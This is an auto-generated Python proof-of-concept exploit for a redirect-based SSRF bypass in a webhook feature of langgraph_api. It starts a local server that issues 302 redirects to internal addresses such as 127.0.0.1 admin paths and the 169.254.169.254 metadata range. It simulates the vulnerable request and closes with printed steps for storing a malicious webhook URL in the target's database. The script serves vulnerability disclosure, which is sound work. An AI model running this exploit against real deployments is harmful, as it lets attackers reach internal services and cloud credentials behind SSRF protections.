#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-028
# Sink: ssrf_safe_async_client
# Auto-generated — run with: python3 ssrf_asyncclient_ssrf_safe_async_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via Redirect Bypass in langgraph_api_src

Vulnerability: The webhook URL is user-controlled and stored in the database.
Although validate_webhook_url_or_raise() validates the initial URL and
SSRFSafeTransport blocks direct requests to private IPs, the HTTP client
follows redirects (follow_redirects=True) without re-validating the redirect
target. An attacker can host a server that redirects to an internal IP
(e.g., 127.0.0.1, 169.254.169.254), bypassing the SSRF protection.

This PoC demonstrates the bypass by:
1. Starting a local HTTP server that redirects to an internal IP
2. Sending a request to the vulnerable endpoint with the redirector URL
3. Showing that the redirect is followed to the internal target

Requirements: Python 3.7+, httpx (for realistic simulation), or just stdlib
"""

import argparse
import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

# Try to import httpx for realistic simulation, fall back to urllib
try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False
    import urllib.request
    import urllib.error


class RedirectHandler(BaseHTTPRequestHandler):
    """HTTP handler that redirects to a specified target."""
    
    def do_GET(self):
        """Handle GET request - redirect to target."""
        target = self.server.redirect_target
        self.send_response(302)
        self.send_header('Location', target)
        self.end_headers()
    
    def do_POST(self):
        """Handle POST request - redirect to target."""
        target = self.server.redirect_target
        self.send_response(302)
        self.send_header('Location', target)
        self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default logging."""
        pass


class RedirectServer:
    """Simple HTTP server that redirects all requests to a target URL."""
    
    def __init__(self, redirect_target, host='127.0.0.1', port=0):
        self.redirect_target = redirect_target
        self.host = host
        self.port = port
        self.server = None
        self.thread = None
    
    def start(self):
        """Start the redirect server in a background thread."""
        self.server = HTTPServer((self.host, self.port), RedirectHandler)
        self.server.redirect_target = self.redirect_target
        self.port = self.server.server_address[1]
        
        self.thread = threading.Thread(target=self.server.serve_forever)
        self.thread.daemon = True
        self.thread.start()
        print(f"[*] Redirect server started on {self.host}:{self.port}")
        print(f"[*] Redirecting to: {self.redirect_target}")
        return self.port
    
    def stop(self):
        """Stop the redirect server."""
        if self.server:
            self.server.shutdown()
            self.thread.join(timeout=2)
            print("[*] Redirect server stopped")


def simulate_vulnerable_request(url, follow_redirects=True):
    """
    Simulate the vulnerable webhook request.
    
    This mimics the behavior of the langgraph_api code:
    - Validates the URL (simplified)
    - Makes request with redirect following enabled
    - Does NOT re-validate redirect targets
    """
    print(f"\n[*] Simulating vulnerable request to: {url}")
    print(f"[*] Follow redirects: {follow_redirects}")
    
    # Simulate validation (simplified - just check URL format)
    parsed = urlparse(url)
    if not parsed.scheme or not parsed.netloc:
        print("[!] URL validation failed (invalid format)")
        return False
    
    print("[+] URL validation passed")
    
    if HAS_HTTPX:
        # Use httpx for realistic simulation (same library as vulnerable code)
        try:
            # Create client similar to SSRFSafeTransport but without IP blocking
            # to demonstrate the redirect bypass
            with httpx.Client(follow_redirects=follow_redirects, max_redirects=5) as client:
                response = client.post(url, json={"test": "payload"})
                print(f"[+] Request completed with status: {response.status_code}")
                print(f"[+] Final URL after redirects: {response.url}")
                
                # Check if we reached an internal IP
                final_host = response.url.host
                if final_host in ('127.0.0.1', 'localhost', '0.0.0.0') or \
                   final_host.startswith('169.254.') or \
                   final_host.startswith('10.') or \
                   final_host.startswith('172.16.') or \
                   final_host.startswith('192.168.'):
                    print("[!] VULNERABLE: Redirected to internal IP!")
                    print(f"[!] Final host: {final_host}")
                    return True
                else:
                    print(f"[-] Final host {final_host} is not internal")
                    return False
                    
        except Exception as e:
            print(f"[!] Request failed: {e}")
            return False
    else:
        # Fallback to urllib (less realistic but demonstrates the concept)
        try:
            # urllib follows redirects by default
            req = urllib.request.Request(url, data=b'{"test": "payload"}',
                                        headers={'Content-Type': 'application/json'})
            
            # Disable redirect following to see the redirect
            class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, req, fp, code, msg, headers, newurl):
                    print(f"[+] Got redirect to: {newurl}")
                    # Check if redirect target is internal
                    parsed_new = urlparse(newurl)
                    if parsed_new.hostname in ('127.0.0.1', 'localhost') or \
                       parsed_new.hostname.startswith('169.254.') or \
                       parsed_new.hostname.startswith('10.') or \
                       parsed_new.hostname.startswith('172.16.') or \
                       parsed_new.hostname.startswith('192.168.'):
                        print("[!] VULNERABLE: Redirect target is internal IP!")
                        return None  # Don't follow
                    return super().redirect_request(req, fp, code, msg, headers, newurl)
            
            opener = urllib.request.build_opener(NoRedirectHandler)
            response = opener.open(req, timeout=5)
            print(f"[+] Response status: {response.status}")
            
        except urllib.error.HTTPError as e:
            print(f"[!] HTTP error: {e.code} - {e.reason}")
        except Exception as e:
            print(f"[!] Error: {e}")
        
        return False


def main():
    parser = argparse.ArgumentParser(
        description='PoC: SSRF via Redirect Bypass in langgraph_api_src'
    )
    parser.add_argument('--target', '-t',
                       default='http://127.0.0.1:8080/admin',
                       help='Internal target to reach via SSRF (default: http://127.0.0.1:8080/admin)')
    parser.add_argument('--listen-port', '-p', type=int, default=0,
                       help='Port for redirect server (default: random)')
    parser.add_argument('--no-redirect', action='store_true',
                       help='Disable redirect following to show the bypass is needed')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("SSRF via Redirect Bypass - Proof of Concept")
    print("=" * 60)
    print(f"\n[*] Internal target: {args.target}")
    
    # Start redirect server
    redirect_server = RedirectServer(args.target, port=args.listen_port)
    redirect_port = redirect_server.start()
    
    try:
        # The redirector URL that would be stored in the database
        redirector_url = f"http://127.0.0.1:{redirect_port}/webhook"
        print(f"\n[*] Malicious webhook URL (to store in DB): {redirector_url}")
        
        # Simulate the vulnerable request
        simulate_vulnerable_request(redirector_url, follow_redirects=not args.no_redirect)
        
        print("\n" + "=" * 60)
        print("EXPLOITATION STEPS:")
        print("1. Start this redirect server on a public IP or use a service like webhook.site")
        print("2. Store the redirector URL as the webhook in the database")
        print("3. When the webhook is triggered, the server will redirect to the internal target")
        print("4. The vulnerable code follows the redirect without re-validation")
        print("=" * 60)
        
    finally:
        redirect_server.stop()


if __name__ == '__main__':
    main()
